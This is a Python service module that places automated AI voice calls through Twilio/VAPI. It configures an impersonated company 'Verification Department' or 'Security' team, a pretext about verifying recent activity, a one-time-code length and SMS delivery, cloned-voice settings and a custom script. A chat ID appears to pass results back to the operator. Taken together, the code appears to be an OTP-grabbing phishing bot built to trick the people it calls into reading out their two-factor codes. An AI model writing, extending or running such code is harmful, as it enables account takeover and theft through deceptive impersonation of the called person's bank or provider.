"""
services/twilio_service.py

Twilio service with async AMD support.
"""

import json
import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Optional

from twilio.rest import Client

from config import ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID, NGROK_URL, build_public_base_url
from core.files import ensure_user_path, user_conf_path, write_user_file

logger = logging.getLogger(__name__)

_twilio_client = None
_call_executor = ThreadPoolExecutor(
    max_workers=4,
    thread_name_prefix="twilio-call",
)


def get_twilio_client():
    global _twilio_client
    if _twilio_client is None:
        if ACCOUNT_SID and AUTH_TOKEN and "YOUR_" not in str(ACCOUNT_SID):
            _twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)
        else:
            logger.error("Twilio credentials not properly configured")
    return _twilio_client


def make_call(to: str, from_number: str = None, caller_id: str = None,
              webhook_url: str = None, user_id: str = "",
              record: bool = True, machine_detection: Optional[str] = None,
              async_amd: bool = False,
              async_amd_status_callback: str = None,
              machine_detection_timeout: Optional[int] = None,
              machine_detection_speech_threshold: Optional[int] = None,
              machine_detection_speech_end_threshold: Optional[int] = None,
              machine_detection_silence_timeout: Optional[int] = None,
              **kwargs) -> Optional[str]:
    from services.vapi_service import create_call as vapi_create_call
    from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
    from services.prompt_builder import PromptBuilder
    from core.files import read_user_file, user_conf_path

    name = kwargs.get("name") or read_user_file(user_id, "Name.txt", "Customer")
    company = kwargs.get("company") or read_user_file(user_id, "Company Name.txt", "Verification Department")
    department = kwargs.get("department") or read_user_file(user_id, "Department.txt", "Security")
    reason = kwargs.get("reason") or read_user_file(user_id, "Reason.txt", "verify your recent activity and confirm your identity")
    chat_id = kwargs.get("chat_id")
    code_length_str = kwargs.get("code_length") or read_user_file(user_id, "CodeLength.txt", "6")
    code_length = int(code_length_str)
    delivery_method = kwargs.get("delivery_method") or read_user_file(user_id, "Delivery.txt", "sms")
    voice_provider = kwargs.get("voice_provider") or read_user_file(user_id, "VoiceProvider.txt", "elevenlabs")
    voice_id = kwargs.get("voice_id") or read_user_file(user_id, "Voice.txt", "")
    emotion = kwargs.get("emotion") or read_user_file(user_id, "emotion.txt", "neutral")
    language = kwargs.get("language") or read_user_file(user_id, "Language.txt", "en")
    speaking_style = kwargs.get("speaking_style") or read_user_file(user_id, "SpeakingStyle.txt", "") or None
    speech_speed = float(kwargs.get("speech_speed") or read_user_file(user_id, "SpeechSpeed.txt", "1.0"))

    customer_name = name

    metadata = CallMetadata(
        target=TargetInfo(name=name, phone=to, customer_type="customer"),
        company=CompanyInfo(name=company, department=department),
        reason=reason,
        otp=OTPConfig(length=code_length, delivery_method=delivery_method),
        ai=AIBehavior(
            voice_provider=voice_provider,
            voice_id=voice_id,
            language=language,
            emotion=emotion,
            speaking_style=speaking_style,
            speech_speed=speech_speed,
        ),
    )
    custom_instructions = kwargs.get("custom_instructions") or read_user_file(user_id, "custom_script.txt", "") or None
    if custom_instructions:
        metadata.custom_instructions = custom_instructions
    metadata.internal = {
        "user_id": user_id,
        "chat_id": chat_id,
        "code_length": code_length,
    }

    builder = PromptBuilder()
    system_prompt = builder.build(metadata)
    assistant_overrides = metadata.to_vapi_assistant_overrides()
    assistant_overrides["model"]["messages"] = [
        {"role": "system", "content": system_prompt},
    ]

    call_metadata = {
        "user_id": user_id,
        "chat_id": str(chat_id) if chat_id else "",
        "code_length": str(code_length),
    }

    vapi_call_id = vapi_create_call(
        customer_number=to,
        customer_name=customer_name,
        assistant_overrides=assistant_overrides,
        metadata=call_metadata,
        webhook_url=None,
    )

    if vapi_call_id:
        logger.info("[VAPI_CALL] Created call id=%s for %s (user=%s)", vapi_call_id, to, user_id)
        store_call_metadata(user_id, vapi_call_id, target=to)
        return vapi_call_id

    logger.error("[VAPI_CALL] Failed to create call for %s (user=%s)", to, user_id)
    return None


def make_call_and_store_async(
    user_id: str,
    to: str,
    from_number: str = None,
    caller_id: str = None,
    webhook_url: str = None,
    record: bool = True,
    machine_detection: Optional[str] = None,
    async_amd: bool = False,
    async_amd_status_callback: str = None,
    machine_detection_timeout: Optional[int] = None,
    machine_detection_speech_threshold: Optional[int] = None,
    machine_detection_speech_end_threshold: Optional[int] = None,
    machine_detection_silence_timeout: Optional[int] = None,
    target: str = "",
    **kwargs,
):
    """Launch a Twilio call and persist metadata in the background."""

    def _run() -> Optional[str]:
        sid = make_call(
            to=to,
            from_number=from_number,
            caller_id=caller_id,
            webhook_url=webhook_url,
            user_id=user_id,
            record=record,
            machine_detection=machine_detection,
            async_amd=async_amd,
            async_amd_status_callback=async_amd_status_callback,
            **kwargs,
        )
        if sid:
            store_call_metadata(user_id, sid, target=target)
        return sid

    try:
        return _call_executor.submit(_run)
    except Exception as exc:
        logger.error("Twilio call + metadata dispatch failed: %s", exc, exc_info=True)
        return None


def get_call_status(call_id: str) -> Optional[str]:
    from services.vapi_service import get_call as vapi_get_call
    call_data = vapi_get_call(call_id)
    if call_data:
        return call_data.get("status")
    return None


def store_call_metadata(user_id: str, sid: str, target: str = "") -> None:
    """Store call SID in user's metadata (for live listen)."""
    ensure_user_path(user_id)
    write_user_file(user_id, "call_sid.txt", sid)
    history_path = user_conf_path(user_id) / "call_history.json"
    history = []
    if history_path.exists():
        try:
            with open(history_path, "r", encoding='utf-8') as f:
                history = json.load(f)
        except Exception:
            history = []
    history.append({
        "sid": sid,
        "target": target,
        "started": datetime.now().isoformat(),
        "status": "initiated"
    })
    with open(history_path, "w", encoding='utf-8') as f:
        json.dump(history, f, indent=2)
